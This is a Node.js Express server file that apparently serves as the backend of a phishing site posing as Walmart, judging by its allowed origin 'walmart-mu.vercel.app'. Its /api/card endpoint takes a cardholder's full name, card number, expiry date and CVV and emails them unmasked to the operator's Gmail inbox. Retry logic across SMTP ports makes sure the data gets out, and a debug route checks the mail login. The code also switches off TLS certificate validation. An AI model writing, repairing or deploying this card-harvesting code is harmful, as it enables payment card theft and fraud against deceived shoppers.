// HOW TO HOST LOCALLY: npm install && node api.js[](http://localhost:3000)
// For Render: Set GMAIL_USER/GMAIL_PASS in dashboard. No fs/sendmail.

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Load local .env in development (optional). Ensure .env is in .gitignore and don't commit secrets.
try {
	// optional: if not installed, we don't want the app to crash
	/* eslint-disable global-require */
	require('dotenv').config();
	/* eslint-enable global-require */
} catch (err) {
	// Do not throw — dotenv is optional. Provide a helpful hint.
	if (err && err.code === 'MODULE_NOT_FOUND') {
		console.warn("Optional module 'dotenv' not found. To load a local .env during development run: npm install dotenv --save-dev");
	} else {
		console.warn("Warning loading dotenv:", err && err.message);
	}
}

const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'https://walmart-mu.vercel.app',
  'https://walmartbackend-i8tm.onrender.com'
];

app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
}));

app.use(express.json());

app.use((req, res, next) => {
  const origin = req.headers.origin;
  console.log('Incoming request from origin:', origin); // Debug
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

console.log('CORS allowed origins:', allowedOrigins);

app.options('/api/card', (req, res) => res.sendStatus(200));

app.post('/api/card', async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  // Avoid logging sensitive full card data. Mask all but last 4 digits if available.
  const maskedCard = cardNumber ? String(cardNumber).replace(/\d(?=\d{4})/g, '*') : 'N/A';
  console.log('Received card submission:', { cardName, cardNumber: maskedCard, expiry });

  if (!cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const gmailUser = process.env.GMAIL_USER;
  const gmailPass = process.env.GMAIL_PASS;

  if (!gmailUser || !gmailPass) {
    console.warn('Missing GMAIL creds - mocking success for dev');
    return res.json({ success: true, message: 'Mock: Email would be sent (creds missing)' });
  }

  // Build SMTP candidates (allow overrides via env vars). We'll try them in order
  const smtpHost = process.env.SMTP_HOST || 'smtp.gmail.com';
  const smtpPort = process.env.SMTP_PORT ? Number(process.env.SMTP_PORT) : undefined;
  const smtpSecure = typeof process.env.SMTP_SECURE !== 'undefined' ? (process.env.SMTP_SECURE === 'true') : undefined;

  const smtpCandidates = [];
  // If user explicitly set port/secure, prefer that single config
  if (smtpPort !== undefined || smtpSecure !== undefined) {
    smtpCandidates.push({ host: smtpHost, port: smtpPort || 465, secure: typeof smtpSecure === 'boolean' ? smtpSecure : (smtpPort === 465), name: `env:${smtpHost}:${smtpPort || 465}` });
  } else {
    // common reliable options for Gmail: 465 (SSL) then 587 (STARTTLS)
    smtpCandidates.push({ host: smtpHost, port: 465, secure: true, name: `${smtpHost}:465(SSL)` });
    smtpCandidates.push({ host: smtpHost, port: 587, secure: false, name: `${smtpHost}:587(STARTTLS)` });
  }

  // Common transporter base options (timeouts etc.)
  const commonTransportOpts = {
    auth: { user: gmailUser, pass: gmailPass },
    requireTLS: true,
    connectionTimeout: 60000, // ms
    greetingTimeout: 30000,
    socketTimeout: 60000,
    tls: { rejectUnauthorized: false }
  };

  const mailOptions = {
    from: gmailUser,
    to: gmailUser,
    subject: 'New Card Submission',
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
  };

  // Helper: small sleep for backoff
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

  // Retry send with exponential backoff for transient errors
  async function sendMailWithRetries(transporter, mail, attempts = 3) {
    let lastErr;
    for (let i = 0; i < attempts; i++) {
      try {
        if (i === 0) {
          await transporter.verify();
        }
        const info = await transporter.sendMail(mail);
        return info;
      } catch (err) {
        lastErr = err;
        const code = err && err.code;
        const retriable = ['ETIMEDOUT', 'EAI_AGAIN', 'ECONNRESET', 'ENOTFOUND'].includes(code);
        console.warn(`sendMail attempt ${i + 1} failed, code=${code}: ${err && err.message}`);
        if (!retriable) break;
        await sleep(500 * Math.pow(2, i));
      }
    }
    throw lastErr;
  }

  // Try candidates in order until one succeeds
  async function tryCandidatesAndSend(candidates, mail) {
    let lastErr;
    for (const c of candidates) {
      console.log(`Trying SMTP candidate: ${c.name}`);
      const opts = Object.assign({ host: c.host, port: c.port, secure: c.secure }, commonTransportOpts);
      const trans = nodemailer.createTransport(opts);
      try {
        const info = await sendMailWithRetries(trans, mail, 3);
        return info;
      } catch (err) {
        lastErr = err;
        console.warn(`Candidate ${c.name} failed: code=${err && err.code} message=${err && err.message}`);
        try { trans.close && trans.close(); } catch (_) {}
        // if DNS error or timeout, keep trying other candidates
      }
    }
    throw lastErr;
  }

  try {
    const info = await tryCandidatesAndSend(smtpCandidates, mailOptions);
    console.log('Email sent:', info && (info.response || info.messageId));
    res.json({ success: true, message: 'Email sent', info: info && (info.response || info.messageId) });
  } catch (err) {
    console.error('Email error:', {
      message: err && err.message,
      code: err && err.code,
      command: err && err.command,
      response: err && err.response
    });
    // close transporter if available
    try { /* nothing to close here - candidates were closed above if created */ } catch (_) {}
    res.status(500).json({
      error: 'Failed to send email',
      details: err && err.message,
      code: err && err.code,
      command: err && err.command
    });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ ok: true, env: process.env.NODE_ENV || 'development' });
});

// Debug endpoint: verify SMTP auth/connectivity without sending mail
app.get('/api/debug/smtp', async (req, res) => {
  const gmailUser = process.env.GMAIL_USER;
  const gmailPass = process.env.GMAIL_PASS;
  if (!gmailUser || !gmailPass) {
    return res.status(400).json({ ok: false, message: 'Missing GMAIL_USER or GMAIL_PASS in environment' });
  }

  // Build candidates the same way as in POST /api/card
  const smtpHost = process.env.SMTP_HOST || 'smtp.gmail.com';
  const smtpPort = process.env.SMTP_PORT ? Number(process.env.SMTP_PORT) : undefined;
  const smtpSecure = typeof process.env.SMTP_SECURE !== 'undefined' ? (process.env.SMTP_SECURE === 'true') : undefined;

  const smtpCandidates = [];
  if (smtpPort !== undefined || smtpSecure !== undefined) {
    smtpCandidates.push({ host: smtpHost, port: smtpPort || 465, secure: typeof smtpSecure === 'boolean' ? smtpSecure : (smtpPort === 465), name: `env:${smtpHost}:${smtpPort || 465}` });
  } else {
    smtpCandidates.push({ host: smtpHost, port: 465, secure: true, name: `${smtpHost}:465(SSL)` });
    smtpCandidates.push({ host: smtpHost, port: 587, secure: false, name: `${smtpHost}:587(STARTTLS)` });
  }

  const commonTransportOpts = {
    auth: { user: gmailUser, pass: gmailPass },
    requireTLS: true,
    connectionTimeout: 60000,
    greetingTimeout: 30000,
    socketTimeout: 60000,
    tls: { rejectUnauthorized: false }
  };

  for (const c of smtpCandidates) {
    const opts = Object.assign({ host: c.host, port: c.port, secure: c.secure }, commonTransportOpts);
    const trans = nodemailer.createTransport(opts);
    try {
      await trans.verify();
      try { trans.close && trans.close(); } catch (_) {}
      return res.json({ ok: true, candidate: c.name, message: 'SMTP verified (auth successful)'});
    } catch (err) {
      // don't leak password - return code/message only
      try { trans.close && trans.close(); } catch (_) {}
      // Try next candidate if possible
      // If last candidate, return error details helpful for debugging
      const last = smtpCandidates[smtpCandidates.length - 1] === c;
      if (last) {
        return res.status(500).json({ ok: false, candidate: c.name, code: err && err.code, message: err && err.message });
      }
      // otherwise continue loop
    }
  }
  // fallback
  res.status(500).json({ ok: false, message: 'Unknown error verifying SMTP' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`API server running on host 0.0.0.0 and port ${PORT}`);
});